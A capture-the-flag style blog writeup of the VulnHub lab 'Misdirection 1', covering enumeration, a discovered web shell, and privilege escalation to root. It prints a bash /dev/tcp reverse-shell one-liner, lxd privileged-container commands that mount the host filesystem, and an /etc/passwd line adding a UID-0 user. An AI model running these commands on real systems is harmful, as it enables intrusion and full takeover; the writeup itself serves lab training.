+++
title = "Vulnub: Misdirection 1"
date = "2021-04-21"
author = ""
authorTwitter = "" #do not include @
cover = ""
tags = ["Beginner", "Vulnhub", "OSCP Prep", "Sudo", "lxd", "Writeable Passwd"]
keywords = ["", ""]
description = ""
showFullContent = false
draft = false
+++

<!--more-->
{{< image src="/img/misdirection1/misdirection.png" alt="" position="center" style="border-radius: 8px;" >}}

| Difficulty | Release Date | Author |
| ---------- | ------------ | ------ |
| Beginner | 24 Sep 2019 | FalconSpy | 

## Summary

For this box, initial access was a web shell discovered. Then with low priv shell we could run bash as brexit user
and were able to pivot to that account. Once we are brexit user, we abuse his membership to the lxd to start a 
privileged container that can read and write the whole file system by mounting it in the container.

## Reconnaissance

Nmap

```sh
Nmap scan report for 192.168.191.136
Host is up (0.00032s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
## Enumeration

### 8080 (HTTP)

Nmap

```sh
# Nmap 7.91 scan initiated Wed Apr 14 06:31:44 2021 as: nmap -n -Pn -sV -p 8080 --script default,http-enum,http-shellshock,http-backup-finder,http-config-backup --append-output -oN recon-misdirection1/misdirection1-8080-httpnmap.enum 192.168.191.136
Nmap scan report for 192.168.191.136
Host is up (0.00026s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-enum:
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /help/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /manual/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

ffuf

```sh
ffuf -ic -c -u http://192.168.191.136:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 
```

```sh
js                      [Status: 301, Size: 322, Words: 20, Lines: 10]
help                    [Status: 301, Size: 324, Words: 20, Lines: 10]
wordpress               [Status: 301, Size: 329, Words: 20, Lines: 10]
manual                  [Status: 301, Size: 326, Words: 20, Lines: 10]
debug                   [Status: 301, Size: 325, Words: 20, Lines: 10]
development             [Status: 301, Size: 331, Words: 20, Lines: 10]
shell                   [Status: 301, Size: 325, Words: 20, Lines: 10]
images                  [Status: 301, Size: 326, Words: 20, Lines: 10]
css                     [Status: 301, Size: 323, Words: 20, Lines: 10]
scripts                 [Status: 301, Size: 327, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 305, Words: 22, Lines: 12]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
```

After some directory bruteforcing on both port 80 and 8080 I discovered several directories. On port 8080 the debug directory
contains a web shell.

{{< image src="/img/misdirection1/misdirection-1.png" alt="" position="center" style="border-radius: 8px;" >}}

## Shell as www-data

Supplying the following command we are able to get a reverse shell.

```sh
bash -c 'bash -i >& /dev/tcp/192.168.191.1/9000 0>&1 &'
```
shell:

{{< image src="/img/misdirection1/misdirection-2.png" alt="" position="center" style="border-radius: 8px;" >}}

After some basic enumeration we discover www-data has sudo permissions to run /bin/bash as brexit user without
any password requirement.

{{< image src="/img/misdirection1/misdirection-3.png" alt="" position="center" style="border-radius: 8px;" >}}

## Shell as brexit

```sh
sudo -u brexit /bin/bash
```

{{< image src="/img/misdirection1/misdirection-4.png" alt="" position="center" style="border-radius: 8px;" >}}

On running id we see that brexit is in the lxd group and no images are present.

{{< image src="/img/misdirection1/misdirection-10.png" alt="" position="center" style="border-radius: 8px;" >}}

## Shell as root

Brexit being in the lxd group allows for privilege escalation. First we need to add am image then create a container.

First we need to get distrobuilder, the compile it. This uses go to compile therefore you need go to be installed.

```sh
wget https://github.com/lxc/distrobuilder/archive/refs/tags/distrobuilder-1.2.zip
7z x distrobuilder-1.2.zip
cd distrobuilder-distrobuilder-1.2 
make
```

You can use go get as the repo instructions recommend but for me it didn't work as expected.

With distrobuilder ready, download the alpine image yaml file to build a small alpine image for lxd

```sh
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```
Then run distrobuilder with the alpine yaml file as below.

```sh
sudo ~/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```
This will result in two files: lxd.tar.xz and rootfs.squashfs.

We then need to transfer this two files to our victim for privesc.

```sh
# on kali

python3 -m http.server

# on victim

wget 192.168.191.1:8000/lxd.tar.xz
wget 192.168.191.1:8000/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
```

{{< image src="/img/misdirection1/misdirection-5.png" alt="" position="center" style="border-radius: 8px;" >}}

After adding the image we need to run lxd init and can keep everything default.

```sh
lxd init
```

{{< image src="/img/misdirection1/misdirection-7.png" alt="" position="center" style="border-radius: 8px;" >}}

Then create the container to be privileged and mount the host os file system inside it.

```sh
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```
With this we can read the host file system from inside the container and can read root.txt.

{{< image src="/img/misdirection1/misdirection-8.png" alt="" position="center" style="border-radius: 8px;" >}}

To get shell as root I added a public key to authorized_keys of the root user and can ssh in as root.

{{< image src="/img/misdirection1/misdirection-9.png" alt="" position="center" style="border-radius: 8px;" >}}

## Extras

After looking at other writeups, there was another easy privesc that I didn't explore.

- Writeable /etc/passwd file

The passwd file is writeable by the users in the brexit group.

{{< image src="/img/misdirection1/misdirection-11.png" alt="" position="center" style="border-radius: 8px;" >}}

We can add user with id 0 that will give us root privileges.

```sh
openssl passwd -1 -salt user password123

echo 'user:$1$user$nY3qj2koDQU1.5HG4ZTj9/:0:0:User:/root:/bin/bash' >>/etc/passwd
```

{{< image src="/img/misdirection1/misdirection-12.png" alt="" position="center" style="border-radius: 8px;" >}}

## References

```
https://rioasmara.com/2021/01/29/privilege-escalation-with-lxd/

https://www.hackingarticles.in/lxd-privilege-escalation/

https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd
```
